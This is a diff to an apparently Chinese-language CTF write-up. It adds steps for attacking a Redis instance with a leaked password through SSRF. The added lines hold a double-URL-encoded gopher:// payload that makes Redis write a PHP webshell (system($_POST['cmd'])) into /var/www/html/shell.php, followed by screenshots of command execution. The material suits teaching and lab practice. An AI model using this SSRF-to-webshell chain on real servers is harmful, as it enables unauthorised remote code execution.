@@ -309,7 +309,7 @@ if(isset($_POST['file'])){
 }
 
 ```
-看到了redis密码，那就是打密码泄露的redis了，加上auth root就好了
+看到了redis密码，那就是打密码泄露的redis了，加上auth root就好了，我们直接写webshell
 payload：
 ```sql
 auth root
@@ -319,3 +319,10 @@ set margin "<?php system($_POST['cmd']);?>"
 save
 quit
 ```
+url编码两次用gopher协议发包
+```http
+?url=gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Fvar%252Fwww%252Fhtml%252F%250Aconfig%2520set%2520dbfilename%2520shell.php%250Aset%2520margin%2520%2522%253C%253Fphp%2520system(%2524_POST%255B%27cmd%27%255D)%253B%253F%253E%2522%250Asave%250Aquit
+```
+![500](assets/Day%206/file-20251224202619629.png)
+最后命令执行
+![500](assets/Day%206/file-20251224202452764.png)
